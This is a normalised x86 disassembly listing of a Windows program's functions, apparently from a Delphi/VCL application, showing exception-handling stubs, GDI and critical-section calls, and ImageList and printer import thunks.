sub_420c76
jmp sub_4036f4
sub_420c7b
mov ebx 0x80030009
call sub_403a5c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_420cd9
jmp sub_4036f4
sub_420cde
mov ebx 0x8000ffff
call sub_403a5c
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_420ea9
jmp sub_4039a8
sub_420eba
jmp sub_4036f4
sub_420ebf
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403a5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420ee8
lea eax [ ebp + 0xc ]
call sub_405a08
retn
sub_420ee1
jmp sub_4039a8
sub_420ee8
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_420ef4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_420f00
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_420f0c
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_420f18
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_420f87
jmp sub_4036f4
sub_420f8c
mov esi 0x8000ffff
call sub_403a5c
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_420fa0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_42100d
jmp sub_4039a8
sub_421014
mov eax [ rw-data ]
call sub_403254
pop edi
pop esi
pop ebx
pop ebp
retn
sub_421024
call sub_419dc0
retn
sub_4210ec
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_421290
jmp sub_4039a8
sub_421297
pop ebp
retn
sub_421325
jmp sub_4039a8
sub_42132c
pop ebp
retn
sub_421685
jmp sub_4039a8
sub_42168c
pop ebp
retn
sub_421690
sub [ rw-data ] 0x1
retn
sub_42214d
add eax 0xffffffd8
jmp sub_426a5c
sub_422155
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_422718
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_42278c
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_422800
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_42280c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4228ec
jmp sub_4039a8
sub_4228f3
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422983
jmp sub_4039a8
sub_422a15
jmp sub_4039a8
sub_422a1c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422a80
jmp sub_4039a8
sub_422a87
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_422aef
jmp sub_4039a8
sub_422af6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_422b99
jmp sub_4039a8
sub_422ba0
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422ff8
push 0x33
mov ecx rw-data
call sub_41a080
retn
sub_423008
push 0x33
mov ecx rw-data
call sub_41a040
retn
sub_423018
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_42303c
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_423210
push 0x11
mov ecx rw-data
call sub_41a040
retn
sub_423350
push ebx
mov ebx eax
mov eax ebx
call sub_423018
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_42340a
jmp sub_4039a8
sub_423411
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_42303c
retn
sub_423427
jmp sub_4039a8
sub_423440
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_42349d
jmp sub_4039a8
sub_4234a4
pop ebx
pop ecx
pop ebp
retn
sub_42361d
jmp sub_4039a8
sub_423645
jmp sub_4039a8
sub_42364c
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4236b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_404208
pop esi
pop ebx
retn
sub_42372c
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_423688
push eax
call sub_40651c
neg eax
pop ebx
retn
sub_4237a0
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_4237d0
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_4238ee
jmp sub_4039a8
sub_4238f5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_42303c
retn
sub_42390b
jmp sub_4039a8
sub_423981
jmp sub_4039a8
sub_423988
pop ebx
pop ecx
pop ebp
retn
sub_42398c
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_423a42
jmp sub_4039a8
sub_423a88
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_423bc7
jmp sub_4039a8
sub_423bce
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_42303c
retn
sub_423be4
jmp sub_4039a8
sub_423c5d
jmp sub_4039a8
sub_423c64
pop ebx
pop ecx
pop ebp
retn
sub_423d95
jmp sub_4039a8
sub_423da8
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_424164
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_42445c
jmp sub_4039a8
sub_424463
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42446c
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_4244a4
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4244b0
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_424614
retn
sub_4246dd
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_4246f4
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_4247e0
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424800
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424820
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424840
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
pop ebx
retn
sub_424858
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
pop ebx
retn
sub_42487c
mov eax [ rw-data ]
call sub_424858
retn
sub_4248de
jmp sub_4039a8
sub_4248e5
pop ecx
pop ebp
retn
sub_424984
jmp sub_4039a8
sub_42498b
pop ebx
mov esp ebp
pop ebp
retn
sub_424a5d
jmp sub_4039a8
sub_424aee
jmp sub_4039a8
sub_424af5
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424b20
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_424c07
jmp sub_4039a8
sub_424db4
jmp sub_4039a8
sub_424dbb
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_424fcd
jmp sub_4039a8
sub_424fd4
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_42506e
jmp sub_4039a8
sub_42524a
jmp sub_4039a8
sub_425304
jmp sub_4039a8
sub_42530b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42532b
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_425324
jmp sub_4039a8
sub_42532b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4254b9
jmp sub_4039a8
sub_425684
jmp sub_4039a8
sub_42568b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4256ae
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4027e4
retn
sub_4256a7
jmp sub_4039a8
sub_4256ae
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4256ce
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4027e4
retn
sub_4256c7
jmp sub_4039a8
sub_4256ce
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4256d8
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_425838
push 0x0
call sub_4257d4
retn
sub_4258dd
jmp sub_4039a8
sub_4258e4
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4258f0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_425840
pop ebx
pop ebp
retn 0x4
sub_425904
retn
sub_425908
test eax eax
jne r-xdata
retn
call sub_425904
sub_425adb
jmp sub_4039a8
sub_425b02
jmp sub_4039a8
sub_425b09
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425b48
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_425d15
mov eax [ ebp - 0xc ]
call sub_403254
retn
sub_425d1e
jmp sub_4039a8
j_sub_425d15
jmp sub_425d15
sub_425d25
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403254
retn
sub_425d3b
jmp sub_4039a8
sub_425d4c
xor eax eax
retn
sub_425d50
mov al [ eax + 0x21 ]
retn
sub_425d9c
jmp sub_4039a8
sub_425da3
pop esi
pop ecx
pop ebp
retn
sub_425dd0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_425e27
jmp sub_4039a8
sub_425e2e
pop esi
pop ecx
pop ebp
retn
sub_425e34
retn
sub_425e38
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_425e48
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_425fcd
jmp sub_4039a8
sub_425fd4
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_4260f3
jmp sub_4039a8
sub_4260fa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42618b
jmp sub_4039a8
sub_426192
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42621a
jmp sub_4039a8
sub_426221
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4263ab
jmp sub_4039a8
sub_4263b2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_426568
jmp sub_4036f4
sub_4265c8
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_425ef0
mov [ rw-data ] eax
sub_4265e8
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_426478
mov [ rw-data ] eax
sub_426710
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_4266ac
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_426728
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_4266ac
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_426740
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_4266ac
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_4267e8
jmp sub_4036f4
sub_4268cb
jmp sub_4036f4
sub_42692c
jmp sub_4039a8
sub_426933
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4269b3
jmp sub_4036f4
sub_426a2c
push ebx
mov ebx edx
call sub_4265e8
mov edx ebx
call sub_42658c
test eax eax
setne al
pop ebx
retn
sub_426a44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_426710
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_426a5c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_426710
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
sub_426bc9
jmp sub_4036f4
sub_426c47
jmp sub_4039a8
sub_426c4e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426de8
retn
sub_426e5c
jmp sub_4039a8
sub_427073
jmp sub_4039a8
sub_42707a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427097
lea eax [ ebp - 0x20 ]
call sub_403fa4
retn
sub_427090
jmp sub_4039a8
sub_4273a4
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_4273ac
mov edx [ eax + 0x28 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_427420
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
mov eax ebx
call sub_427594
sub_427438
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
mov eax ebx
call sub_427594
sub_4276e8
jmp sub_4039a8
sub_4276ef
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427867
jmp sub_4039a8
sub_42786e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4278fd
jmp sub_4039a8
sub_427904
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427926
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc8
retn
sub_42791f
jmp sub_4039a8
sub_427926
pop ebx
mov esp ebp
pop ebp
retn
sub_427939
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_427cb0
jmp r-xdata
retn
sub_42794f
call sub_427d3c
retn
sub_427ad4
retn
sub_427d2c
jmp sub_4039a8
sub_427e57
jmp sub_4039a8
sub_427e5e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_427e77
jmp sub_4039a8
sub_427f3c
push ebx
mov ebx eax
mov eax ebx
call sub_427bac
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x8 ]
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov eax edx
pop ebx
retn
sub_42806a
jmp sub_4039a8
sub_428092
jmp sub_4039a8
sub_428099
mov esp ebp
pop ebp
retn
sub_428110
jmp sub_4039a8
sub_428218
jmp sub_4039a8
sub_428303
jmp sub_4039a8
sub_428310
inc [ eax + 0x4 ]
retn
sub_42848b
jmp sub_4039a8
sub_42883c
jmp sub_4039a8
sub_428a86
jmp sub_4039a8
sub_428ab0
jmp sub_4039a8
sub_428ab7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428ad9
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_428ad2
jmp sub_4039a8
sub_428ae3
jmp sub_4036f4
sub_428b32
jmp sub_4039a8
sub_428d5f
jmp sub_4039a8
sub_428da7
jmp sub_4039a8
sub_428f14
jmp sub_4039a8
sub_428fdb
jmp sub_4036f4
sub_429030
mov [ eax + 0x31 ] 0x0
call sub_425b48
retn
sub_429281
jmp sub_4039a8
sub_4292ec
jmp sub_4039a8
sub_4292f3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429364
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_429418
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_429428
push ebx
mov ebx eax
mov eax ebx
call sub_4295e0
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_42943c
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_429458
push ebx
mov ebx eax
mov eax ebx
call sub_429640
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_4294b4
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_4295c3
jmp sub_4039a8
sub_4297f4
jmp sub_4039a8
sub_4297fb
pop ebx
pop ecx
pop ebp
retn
sub_429887
jmp sub_4036f4
sub_4298e7
jmp sub_4039a8
sub_4298ee
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_429ccf
jmp sub_4039a8
sub_429cfb
jmp sub_4039a8
sub_429d62
jmp sub_4036f4
sub_429d93
jmp sub_4039a8
sub_429e18
jmp sub_4036f4
sub_429e1d
mov eax [ ebp - 0x38 ]
call sub_403254
call sub_403a08
call sub_403a5c
sub_429e2f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429e4c
mov eax [ ebp - 0x18 ]
call sub_4027e4
retn
sub_429e45
jmp sub_4039a8
sub_429f9b
jmp sub_4036f4
sub_42a267
jmp sub_4036f4
sub_42a348
mov cl 0x1
call sub_42a350
retn
sub_42a660
xor ecx ecx
call sub_42a350
retn
sub_42a6e2
jmp sub_4036f4
sub_42a6e7
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403a08
call sub_403a5c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42a738
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_42a871
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_42a8a0
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_42a8b4
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_42a9cd
jmp sub_4036f4
sub_42aa82
jmp sub_4036f4
sub_42aaec
jmp sub_4036f4
sub_42ab20
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_42aaac
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_42ab38
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_424840
retn
mov [ eax + 0x30 ] edx
retn
sub_42ab50
retn
sub_42ab54
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_424840
retn
mov [ eax + 0x2c ] edx
retn
sub_42ab94
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_424840
pop ebp
retn 0x4
sub_42aba8
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_424840
pop ebp
retn 0x4
sub_42abfd
jmp sub_4039a8
sub_42ac04
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42adb8
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_42adc4
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42ae71
jmp sub_4039a8
sub_42ae78
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42af63
jmp sub_4036f4
sub_42afcf
jmp sub_4039a8
sub_42b0fd
jmp sub_4039a8
sub_42b104
pop ebp
retn
sub_42b239
jmp sub_4039a8
sub_42b240
pop ebp
retn
sub_42b244
sub [ rw-data ] 0x1
retn
sub_42b3e8
call sub_41a474
retn
sub_42b470
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a7e0
pop esi
pop ebx
retn
sub_42b498
call sub_41a62c
retn
sub_42b4d4
call sub_41a714
retn
sub_42b5cc
call sub_42b3e8
retn
sub_42b604
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42b470
pop esi
pop ebx
retn
sub_42b618
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42b484
pop esi
pop ebx
retn
sub_42b62c
mov edx ecx
call sub_42b604
retn
sub_42b634
call sub_42b498
retn
sub_42b6a4
call sub_42b4d4
retn
sub_42b738
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_41a5d0
retn
sub_42b76c
mov eax [ eax + 0x4 ]
call sub_41a474
retn
sub_42b79d
jmp sub_4039a8
sub_42b7a4
pop ebp
retn
sub_42b7a8
sub [ rw-data ] 0x1
retn
ImageList_Create
jmp [ __import_lookup_table_14(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ __import_lookup_table_14(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_14(comctl32:ImageList_GetImageCount) ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
ImageList_Replace
jmp [ ImageList_Replace@IAT ]
ImageList_Remove
jmp [ __import_lookup_table_14(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ __import_lookup_table_14(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ __import_lookup_table_14(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ __import_lookup_table_14(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ __import_lookup_table_14(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ __import_lookup_table_14(comctl32:ImageList_DragMove) ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
sub_42b899
jmp sub_4039a8
sub_42b8a0
pop ebp
retn
sub_42b8a4
sub [ rw-data ] 0x1
retn
sub_42b96b
jmp sub_4039a8
sub_42b972
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42bf88
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_42b994
mov [ rw-data ] sub_42baac
mov [ rw-data ] sub_42ba1c
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_42bcb0
mov [ rw-data ] sub_42bd84
mov [ rw-data ] sub_42be58
retn
sub_42c019
jmp sub_4039a8
sub_42c020
pop ebp
retn
sub_42c024
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42bf88
sub_42c059
jmp sub_4039a8
sub_42c060
pop ebp
retn
sub_42c064
sub [ rw-data ] 0x1
retn
sub_42c2f3
add eax 0xffffffd4
jmp sub_42ce20
sub_42c2fb
add eax 0xffffffd4
jmp sub_42ce7c
sub_42c303
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405ab4
sub_42c30d
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405adc
sub_42c317
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405af0
sub_42c323
mov ch 0xc2
inc edx
add [ edi - 0x36ffbd3e ] bh
retn 0x42
sub_42c32f
popfd
retn 0x42
sub_42c334
retn 0x42
sub_42c337
lodsd [ esi ]
retn 0x42
sub_42c345
inc edx
add bl dl
retn 0x42
sub_42c34d
inc edx
add bl ah
retn 0x42
j_sub_42c317
jmp sub_42c317
sub_42c355
inc edx
add bl dh
retn 0x42
sub_42c35b
sti
retn 0x42
sub_42c3a2
inc edx
add [ eax ] al
add [ eax ] al
add al ch
retn
sub_42c4a6
jmp sub_4039a8
sub_42c4ad
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42c6bd
jmp sub_4039a8
sub_42c6c4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c879
jmp sub_4039a8
sub_42c8de
jmp sub_4039a8
sub_42c8e5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c9d1
jmp sub_4039a8
sub_42c9d8
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42cbe8
lea eax [ ebp - 0x30 ]
call sub_403fa4
lea eax [ ebp - 0x20 ]
call sub_403fa4
retn
sub_42cbf9
jmp sub_4039a8
j_sub_42cbe8
jmp sub_42cbe8
sub_42cc00
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ccfb
jmp sub_4039a8
sub_42cd02
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42cdff
jmp sub_4039a8
sub_42ce06
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ce66
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
sub_42ce6f
jmp sub_4039a8
j_sub_42ce66
jmp sub_42ce66
sub_42ce76
pop ebx
pop ecx
pop ebp
retn
sub_42cf11
jmp sub_4039a8
sub_42cf18
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42cf24
mov eax [ eax + 0x20 ]
retn
sub_42d053
jmp sub_4039a8
sub_42d05a
pop ebp
retn
sub_42d05c
sub [ rw-data ] 0x1
retn
ClosePrinter
jmp [ __import_lookup_table_15(winspool:ClosePrinter) ]
OpenPrinterA
jmp [ OpenPrinterA@IAT ]
sub_42d0a9
jmp sub_4039a8
sub_42d0b0
pop ebp
retn
sub_42d0b4
sub [ rw-data ] 0x1
retn
sub_42d31b
jmp sub_4039a8
sub_42d322
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_42d502
jmp sub_4039a8
sub_42d509
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42d575
jmp sub_4039a8
sub_42d57c
pop ecx
pop ecx
pop ebp
retn
sub_42d893
jmp sub_4039a8
sub_42d89a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42d8fb
jmp sub_4039a8
sub_42d902
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_42d972
jmp sub_4039a8
sub_42d979
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42d980
push ebx
mov ebx eax
